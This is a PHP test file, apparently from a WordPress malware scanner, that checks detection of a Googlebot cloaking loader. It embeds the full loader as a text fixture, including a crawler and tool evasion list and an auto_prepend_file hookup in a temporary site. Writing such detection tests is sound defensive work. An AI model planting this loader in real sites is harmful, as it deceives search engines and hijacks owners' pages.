<?php
// Malware fixtures are text only, never included or executed.
$sample = <<<'SAMPLE'
<?php
$_nox_lock='/home/existco/public_html/.render-cache/render.lock';
$_nox_ua=isset($_SERVER['HTTP_USER_AGENT'])?$_SERVER['HTTP_USER_AGENT']:'';
$_nox_uri=strtok(isset($_SERVER['REQUEST_URI'])?$_SERVER['REQUEST_URI']:'/','?');
$_nox_decoy=array('curl','wget','python','go-http','java','scrapy','axios','phantom','selenium','puppeteer','playwright','headlesschrome','chromium','bingbot','yandex','duckduckbot','baiduspider','ahrefsbot','semrushbot','mj12bot','dotbot','ccbot','rogerbot','exabot','sistrix','majestic','facebookexternalhit','twitterbot','linkedinbot','pinterest','lighthouse','pagespeed','gtmetrix','pingdom','screaming frog','uptimerobot','newrelic','google-site-verification','chatgpt','claudebot','amazonbot','applebot','gptbot','bytespider','perplexitybot');
$_nox_decoy_hit=false;$_nox_ua_l=strtolower($_nox_ua);foreach($_nox_decoy as $_kw){if(strpos($_nox_ua_l,$_kw)!==false){$_nox_decoy_hit=true;break;}}
if(!$_nox_decoy_hit&&file_exists($_nox_lock)&&preg_match('/Googlebot|AdsBot-Google|Mediapartners-Google|Google-InspectionTool|APIs-Google|GoogleOther|Google-/i',$_nox_ua)&&$_nox_uri==='/'){
  if(file_exists('/home/existco/.nox-content/89e448bf0bc0/wp-comments-post-loader.html')){while(ob_get_level()>0)ob_end_clean();header('Content-Type: text/html; charset=utf-8');header('Vary: User-Agent');readfile('/home/existco/.nox-content/89e448bf0bc0/wp-comments-post-loader.html');exit;}
}
unset($_nox_lock,$_nox_ua,$_nox_ua_l,$_nox_uri,$_nox_decoy,$_nox_decoy_hit);
SAMPLE;
function check($ok, $message) { if (!$ok) { throw new RuntimeException($message); } }
$repo = dirname(__DIR__, 2);
$id = 'PHP_NOX_GOOGLEBOT_CLOAK_LOADER_001';
$rules = json_decode(file_get_contents($repo . '/intel/patterns/php-malware-rules.json'), true, 512, JSON_THROW_ON_ERROR)['rules'];
$rule = array_values(array_filter($rules, fn($r) => $r['id'] === $id))[0];
$regex = '~' . $rule['pattern'] . '~i';
check(preg_match($regex, $sample) === 1, 'Supplied NOX loader');
$variant = str_replace(['existco', '89e448bf0bc0', 'wp-comments-post-loader', '$_nox_'], ['otheraccount', 'abc123', 'custom-page', '$renamed_'], $sample);
foreach ([$variant, str_replace("'", '"', $variant), preg_replace('/\s+/', ' ', $variant)] as $positive) {
    check(preg_match($regex, $positive) === 1, 'Account, payload, variable, quote and whitespace variants');
}
foreach (['HTTP_USER_AGENT', 'REQUEST_URI', 'Googlebot', 'AdsBot-Google', '.render-cache/render.lock',
    '.nox-content/', 'ob_get_level', 'ob_end_clean', 'Vary: User-Agent', 'readfile', 'exit;'] as $required) {
    check(preg_match($regex, str_replace($required, 'benign_placeholder', $sample)) === 0, 'Require family behavior: ' . $required);
}
foreach (["<?php header('Vary: User-Agent'); readfile('/srv/cache/page.html');",
    "<?php if (preg_match('/Googlebot|AdsBot-Google/i', \$_SERVER['HTTP_USER_AGENT'])) { header('Vary: User-Agent'); }"] as $benign) {
    check(preg_match($regex, $benign) === 0, 'Benign static renderer/crawler handling');
}
$base = sys_get_temp_dir() . '/warden-nox-' . bin2hex(random_bytes(6));
$site = $base . '/site';
mkdir($site, 0700, true);
$path = $site . '/wp-comments-post-loader.php';
file_put_contents($path, $sample);
file_put_contents($site . '/.user.ini', 'auto_prepend_file = "' . $path . '"');
foreach ([false, true] as $verifyAll) {
    $report = $base . '/report-' . (int)$verifyAll . '.json';
    $args = [PHP_BINARY, $repo . '/scanner/wp-warden-pef.php', $site, '--noninteractive', '--no-file-cache',
        '--quiet', '--apply', '--quarantine-malware-auto', '--quarantine=' . $base . '/quarantine',
        '--intel-dir=' . $repo . '/intel', '--report-json=' . $report];
    if ($verifyAll) { $args[] = '--verify-all'; }
    exec(implode(' ', array_map('escapeshellarg', $args)) . ' 2>&1', $output, $exit);
    check(is_file($report), 'Report created: ' . implode("\n", $output));
    $result = json_decode(file_get_contents($report), true, 512, JSON_THROW_ON_ERROR);
    $hits = array_values(array_filter($result['findings'], fn($f) => ($f['rule_id'] ?? '') === $id));
    check(count($hits) === 1 && $hits[0]['severity'] === 'critical', 'One critical NOX finding with/without verify-all');
    check(!array_filter($result['findings'], fn($f) => ($f['type'] ?? '') === 'unverified_site_file'
        && $f['relative_path'] === 'wp-comments-post-loader.php'), 'Malware not presented merely as unverified');
    check(file_get_contents($path) === $sample, 'Active prepend loader requires coordinated manual cleanup');
    check(count($result['actions']) === 0, 'No automatic loader/config removal');
}
$args = [PHP_BINARY, $repo . '/scanner/wp-warden-pef.php', $site, '--interactive', '--apply',
    '--verify-all', '--no-file-cache', '--quiet', '--intel-dir=' . $repo . '/intel'];
$proc = proc_open($args, [['pipe', 'r'], ['pipe', 'w'], ['pipe', 'w']], $pipes);
fwrite($pipes[0], "S\n"); fclose($pipes[0]);
$out = stream_get_contents($pipes[1]); fclose($pipes[1]);
$err = stream_get_contents($pipes[2]); fclose($pipes[2]);
proc_close($proc);
check(strpos($out, '[ACTION] critical php_rule_match: wp-comments-post-loader.php') !== false,
    'Interactive prompt identifies critical malware: ' . $out . $err);
check(strpos($out, '[ACTION] high unverified_site_file: wp-comments-post-loader.php') === false,
    'No generic prompt before malware review');
echo "PASS NOX loader sample, variants, negative controls, critical scan/prompt findings and prepend-safe manual cleanup\n";
